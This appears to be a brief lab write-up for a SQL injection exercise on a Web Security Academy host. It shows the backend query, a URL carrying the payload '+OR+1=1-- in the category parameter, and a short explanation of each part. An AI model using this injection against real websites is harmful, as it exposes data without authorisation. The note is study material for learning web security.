This is query:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

so we need replace {'+or+1=1--} in 'Gifts':
https://xxxxxxx.web-security-academy.net/filter?category='+OR+1=1--

' It is to start our own queries
Because 1=1 is always a true statement, it returns all products to us as requested
And - which we put at the end, is for commenting
